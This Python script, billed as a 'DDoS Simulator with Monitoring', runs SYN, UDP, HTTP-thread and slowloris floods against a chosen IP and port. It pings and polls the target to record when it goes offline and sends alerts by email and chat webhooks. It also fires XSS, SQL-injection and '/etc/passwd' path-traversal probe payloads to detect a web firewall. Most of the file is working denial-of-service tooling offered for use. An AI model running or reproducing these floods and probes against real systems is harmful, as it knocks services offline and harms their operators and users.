#!/usr/bin/env python3
import threading
import requests
import os
import sys
import time
import smtplib
import getpass
import csv
import json
import hashlib
import argparse
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

log_file = f"ddos_attack_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
json_file = log_file.replace(".txt", ".json")
csv_file = log_file.replace(".txt", ".csv")
target_online = True
went_down_at = None
http_down = False
icmp_down = False
email_password = None

EMAIL_SENDER = "your e-mail"
EMAIL_RECEIVER = "your e-mail"

event_history = []

def log_event(msg):
    timestamp = datetime.now().isoformat()
    event_history.append({"timestamp": timestamp, "event": msg})
    with open(log_file, "a") as f:
        f.write(f"[{timestamp}] {msg}\n")
    print(f"[{timestamp}] {msg}")

def play_alarm():
    try:
        os.system("aplay /usr/share/sounds/alsa/Front_Center.wav >/dev/null 2>&1")
    except:
        print('\a')  # fallback beep

def send_email_alert(ip, method):
    global email_password
    msg = MIMEMultipart()
    msg['From'] = EMAIL_SENDER
    msg['To'] = EMAIL_RECEIVER
    msg['Subject'] = f"[ALERT] Target {ip} went down ({method})"
    body = f"Target {ip} went offline via {method.upper()} at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    msg.attach(MIMEText(body, 'plain'))
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(EMAIL_SENDER, email_password)
        server.send_message(msg)
        server.quit()
        log_event("Alert email sent successfully.")
    except Exception as e:
        log_event(f"Error sending email: {e}")

def send_webhook_alert(ip, method):
    text = f"\u26a0\ufe0f *Target down:* `{ip}` via {method.upper()} at {datetime.now().strftime('%H:%M:%S')}"

    discord_url = os.getenv("DISCORD_WEBHOOK_URL")
    teams_url = os.getenv("TEAMS_WEBHOOK_URL")
    telegram_token = os.getenv("TELEGRAM_BOT_TOKEN")
    telegram_chat_id = os.getenv("TELEGRAM_CHAT_ID")

    if discord_url:
        try:
            requests.post(discord_url, json={"content": text})
            log_event("Notification sent to Discord.")
        except Exception as e:
            log_event(f"Discord error: {e}")

    if teams_url:
        try:
            payload = {"text": text}
            requests.post(teams_url, json=payload)
            log_event("Notification sent to Microsoft Teams.")
        except Exception as e:
            log_event(f"Teams error: {e}")

    if telegram_token and telegram_chat_id:
        try:
            telegram_url = f"https://api.telegram.org/bot{telegram_token}/sendMessage"
            data = {"chat_id": telegram_chat_id, "text": text, "parse_mode": "Markdown"}
            requests.post(telegram_url, data=data)
            log_event("Notification sent to Telegram.")
        except Exception as e:
            log_event(f"Telegram error: {e}")

def detect_waf(url):
    log_event("Checking for WAF presence on the target...")
    test_payloads = [
        "<script>alert(1)</script>",
        "' OR '1'='1", 
        "../../../etc/passwd",
        "<img src=x onerror=alert(1)>"
    ]
    headers = {'User-Agent': 'KaliGPT-WAFDetector'}
    for payload in test_payloads:
        try:
            r = requests.get(url, params={'q': payload}, headers=headers, timeout=5)
            if r.status_code in [403, 406, 429, 503] or 'waf' in r.text.lower():
                log_event(f"\u26a0\ufe0f Possible WAF detected (status {r.status_code}) with payload: {payload}")
                return True
        except Exception as e:
            log_event(f"Error during WAF check: {e}")
    log_event("No apparent WAF detected.")
    return False

def check_http(url):
    try:
        r = requests.get(url, timeout=2)
        return 200 <= r.status_code < 400
    except:
        return False

def check_icmp(ip):
    return os.system(f"ping -c 1 -W 1 {ip} > /dev/null 2>&1") == 0

def monitor_availability(ip, url, duration):
    global target_online, went_down_at, http_down, icmp_down
    start = time.time()
    while time.time() - start < duration:
        http_ok = check_http(url)
        icmp_ok = check_icmp(ip)
        if not http_ok and not http_down:
            http_down = True
            log_event("Target went down via HTTP")
            play_alarm()
            send_email_alert(ip, "HTTP")
            send_webhook_alert(ip, "HTTP")
            if not went_down_at:
                went_down_at = datetime.now()
        if not icmp_ok and not icmp_down:
            icmp_down = True
            log_event("Target went down via ICMP (ping)")
            play_alarm()
            send_email_alert(ip, "ICMP")
            send_webhook_alert(ip, "ICMP")
            if not went_down_at:
                went_down_at = datetime.now()
        time.sleep(2)
    target_online = check_http(url) or check_icmp(ip)

def execute_attack(attack_type, ip, port, url=None, threads=100):
    log_event(f"Starting attack: {attack_type.upper()} against {ip}:{port}")
    if attack_type == "syn":
        os.system(f"sudo hping3 -S --flood -p {port} {ip} &")
    elif attack_type == "udp":
        os.system(f"sudo hping3 --udp --flood -p {port} {ip} &")
    elif attack_type == "http":
        def flood():
            while True:
                try:
                    requests.get(url, timeout=1)
                except:
                    pass
        for _ in range(threads):
            threading.Thread(target=flood, daemon=True).start()
    elif attack_type == "slowloris":
        os.system(f"slowloris {ip} -p {port} &")

def generate_report(ip):
    log_event("\n======================== FINAL REPORT ========================")
    if went_down_at:
        log_event(f"The target went offline at: {went_down_at.strftime('%H:%M:%S')} (local time)")
    else:
        log_event("The target did not go down during the attack")
    status = "ONLINE" if target_online else "OFFLINE"
    log_event(f"Final status of the target: {status}")
    log_event(f"Full log saved at: {log_file}")

    with open(json_file, 'w') as jf:
        json.dump(event_history, jf, indent=2)
        log_event(f"Events exported to JSON: {json_file}")

    with open(csv_file, 'w', newline='') as cf:
        writer = csv.DictWriter(cf, fieldnames=['timestamp', 'event'])
        writer.writeheader()
        writer.writerows(event_history)
        log_event(f"Events exported to CSV: {csv_file}")

    try:
        with open(log_file, 'rb') as lf:
            hash_value = hashlib.sha256(lf.read()).hexdigest()
            log_event(f"SHA256 hash of the log: {hash_value}")
    except Exception as e:
        log_event(f"Error calculating hash: {e}")

def main():
    global email_password

    if os.geteuid() != 0:
        print("This script needs to be run as root.")
        sys.exit(1)

    parser = argparse.ArgumentParser(description="DDoS Simulator with Monitoring")
    parser.add_argument('--type', help='Attack type: syn, udp, http, slowloris')
    parser.add_argument('--ip', help='Target IP')
    parser.add_argument('--port', default='80', help='Target port')
    parser.add_argument('--duration', type=int, default=60, help='Attack duration in seconds')
    args = parser.parse_args()

    email_password = getpass.getpass(prompt=f"Enter app password for {EMAIL_SENDER}: ")

    attack_type = args.type
    ip = args.ip
    port = args.port
    duration = args.duration

    if not attack_type or not ip:
        print("Usage: sudo python3 script.py --type http --ip 192.168.0.10 --port 80 --duration 60")
        sys.exit(1)

    url = f"http://{ip}" if port == "80" else f"https://{ip}:{port}"

    detect_waf(url)
    log_event(f"Preparing to attack {ip} on port {port} with {attack_type.upper()} for {duration}s")
    monitor_thread = threading.Thread(target=monitor_availability, args=(ip, url, duration), daemon=True)
    monitor_thread.start()

    execute_attack(attack_type, ip, port, url)

    log_event(f"Waiting {duration} seconds for attack duration...")
    time.sleep(duration)

    os.system("pkill hping3")
    os.system("pkill slowloris")
    generate_report(ip)

if __name__ == "__main__":
    main()
